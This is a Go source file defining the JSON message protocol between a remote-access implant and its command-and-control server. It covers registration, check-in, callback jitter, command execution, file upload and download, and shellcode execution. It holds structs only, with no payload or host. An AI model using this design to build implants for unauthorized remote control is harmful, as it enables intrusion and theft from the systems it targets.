//Package containing functionality for communication between an implant and the server. This file contains all structures that are sent over the wire
//by the implant/server. These structs get serialized/deserialized with the JSON package.

package communication

const IMPLANT_REGISTER_REQ int = 0
const IMPLANT_REGISTER_RESP int = 1
const IMPLANT_CHECKIN_REQ int = 2
const IMPLANT_CHECKIN_RESP int = 3
const IMPLANT_ERROR_RESP int = 4
const IMPLANT_KILL_REQ int = 5
const IMPLANT_KILL_RESP int = 6
const IMPLANT_CONFIG_REQ int = 7
const IMPLANT_CONFIG_RESP int = 8
const FILE_INFO_REQ int = 11
const FILE_INFO_RESP int = 12
const LS_REQ int = 13
const LS_RESP int = 14
const EXEC_REQ int = 15
const EXEC_RESP int = 16
const CD_REQ int = 17
const CD_RESP int = 18
const DOWNLOAD_REQ int = 19
const DOWNLOAD_RESP int = 20
const UPLOAD_REQ int = 21
const UPLOAD_RESP int = 22
const SHELLCODE_EXEC_REQ int = 23
const SHELLCODE_EXEC_RESP int = 24

// This map correlates all MessageType's to a specific data stucture for a message. This can be used for reflection so that no big switch
// statements have to be created. Note that MessageTypes and TaskTypes are the same.
var MessageTypeToStruct = map[int]func() interface{}{
	IMPLANT_REGISTER_REQ:  func() interface{} { return &ImplantRegisterReq{} },
	IMPLANT_REGISTER_RESP: func() interface{} { return &ImplantRegisterResp{} },
	IMPLANT_CHECKIN_REQ:   func() interface{} { return &ImplantCheckinReq{} },
	IMPLANT_CHECKIN_RESP:  func() interface{} { return &ImplantCheckinResp{} },
	IMPLANT_ERROR_RESP:    func() interface{} { return &ImplantErrorResp{} },
	IMPLANT_KILL_REQ:      func() interface{} { return &ImplantKillReq{} },
	IMPLANT_KILL_RESP:     func() interface{} { return &ImplantKillResp{} },
	IMPLANT_CONFIG_REQ:    func() interface{} { return &ImplantConfigReq{} },
	IMPLANT_CONFIG_RESP:   func() interface{} { return &ImplantConfigResp{} },
	//...
	//reserved for implant functionality

	//modules start
	FILE_INFO_REQ:       func() interface{} { return &FileInfoReq{} },
	FILE_INFO_RESP:      func() interface{} { return &FileInfoResp{} },
	LS_REQ:              func() interface{} { return &LsReq{} },
	LS_RESP:             func() interface{} { return &LsResp{} },
	EXEC_REQ:            func() interface{} { return &ExecReq{} },
	EXEC_RESP:           func() interface{} { return &ExecResp{} },
	CD_REQ:              func() interface{} { return &CdReq{} },
	CD_RESP:             func() interface{} { return &CdResp{} },
	DOWNLOAD_REQ:        func() interface{} { return &DownloadReq{} },
	DOWNLOAD_RESP:       func() interface{} { return &DownloadResp{} },
	UPLOAD_REQ:          func() interface{} { return &UploadReq{} },
	UPLOAD_RESP:         func() interface{} { return &UploadResp{} },
	SHELLCODE_EXEC_REQ:  func() interface{} { return &ShellcodeExecReq{} },
	SHELLCODE_EXEC_RESP: func() interface{} { return &ShellcodeExecResp{} },
}

// Used in CLI to map taskType to readable name
var MessageTypeToModuleName = map[int]string{
	IMPLANT_KILL_REQ:   "implant kill",
	IMPLANT_CONFIG_REQ: "change config",
	FILE_INFO_REQ:      "file info",
	LS_REQ:             "ls",
	EXEC_REQ:           "exec",
	CD_REQ:             "cd",
	DOWNLOAD_REQ:       "download",
	UPLOAD_REQ:         "upload",
	SHELLCODE_EXEC_REQ: "shellcode exec",
}

// A task is a type of message that gets sent after checkin. Every task needs to have an ID so that we know to what task certain
// output belongs.
type Task interface {
	SetTaskId(id string) //This function is only used in the API. It's the API responsibility to generate tasks.
}

type ImplantRegisterReq struct {
	ImplantId   string
	ImplantName string
	Hostname    string
	Username    string
	UID         string
	GID         string
	Os          string
	Arch        string
}

type ImplantRegisterResp struct {
	Success bool
}

type ImplantCheckinReq struct {
	ImplantId string
}

type ImplantCheckinResp struct {
	TaskTypes     []int
	TaskArguments [][]byte
}

type ImplantErrorResp struct {
	TaskId string
	Error  string
}

type ImplantKillReq struct {
	TaskId string
}

func (t *ImplantKillReq) SetTaskId(id string) {
	t.TaskId = id
}

type ImplantKillResp struct {
	TaskId    string
	ImplantId string
}

func (t *ImplantKillResp) SetTaskId(id string) {
	t.TaskId = id
}

type ImplantConfigReq struct {
	TaskId           string
	ServerIp         string `json:"ServerIp"`
	ServerPort       int    `json:"ServerPort"`
	CallbackInterval int    `json:"CallbackInterval"`
	CallbackJitter   int    `json:"CallbackJitter"`
}

func (t *ImplantConfigReq) SetTaskId(id string) {
	t.TaskId = id
}

type ImplantConfigResp struct {
	TaskId  string
	Success bool
}

func (t *ImplantConfigResp) SetTaskId(id string) {
	t.TaskId = id
}

type FileInfoReq struct {
	TaskId     string
	PathToFile string `json:"PathToFile" binding:"required"`
}

func (t *FileInfoReq) SetTaskId(id string) {
	t.TaskId = id
}

type FileInfoResp struct {
	TaskId  string
	Name    string
	Size    int64
	Mode    string
	ModTime int
	IsDir   bool
}

func (t *FileInfoResp) SetTaskId(id string) {
	t.TaskId = id
}

type LsReq struct {
	TaskId string
	Path   string `json:"Path" binding:"required"`
}

func (t *LsReq) SetTaskId(id string) {
	t.TaskId = id
}

type LsResp struct {
	TaskId string
	Result string
}

func (t *LsResp) SetTaskId(id string) {
	t.TaskId = id
}

type ExecReq struct {
	TaskId string
	Cmd    string   `json:"Cmd" binding:"required"`
	Args   []string `json:"Args"`
}

func (t *ExecReq) SetTaskId(id string) {
	t.TaskId = id
}

type ExecResp struct {
	TaskId string
	Output string
}

func (t *ExecResp) SetTaskId(id string) {
	t.TaskId = id
}

type CdReq struct {
	TaskId string
	Path   string `json:"Path" binding:"required"`
}

func (t *CdReq) SetTaskId(id string) {
	t.TaskId = id
}

type CdResp struct {
	TaskId  string
	Success bool
}

func (t *CdResp) SetTaskId(id string) {
	t.TaskId = id
}

type DownloadReq struct {
	TaskId      string
	Origin      string `json:"Origin" binding:"required"`
	Destination string `json:"Destination"`
}

func (t *DownloadReq) SetTaskId(id string) {
	t.TaskId = id
}

type DownloadResp struct {
	TaskId   string
	Contents []byte
}

func (t *DownloadResp) SetTaskId(id string) {
	t.TaskId = id
}

type UploadReq struct {
	TaskId      string
	File        []byte `json:"File" binding:"required"`
	Destination string `json:"Destination"`
}

func (t *UploadReq) SetTaskId(id string) {
	t.TaskId = id
}

type UploadResp struct {
	TaskId  string
	Success bool
}

func (t *UploadResp) SetTaskId(id string) {
	t.TaskId = id
}

type ShellcodeExecReq struct {
	TaskId    string
	Shellcode []byte `json:"Shellcode" binding:"required"`
}

func (t *ShellcodeExecReq) SetTaskId(id string) {
	t.TaskId = id
}

type ShellcodeExecResp struct {
	TaskId  string
	Success bool
}

func (t *ShellcodeExecResp) SetTaskId(id string) {
	t.TaskId = id
}
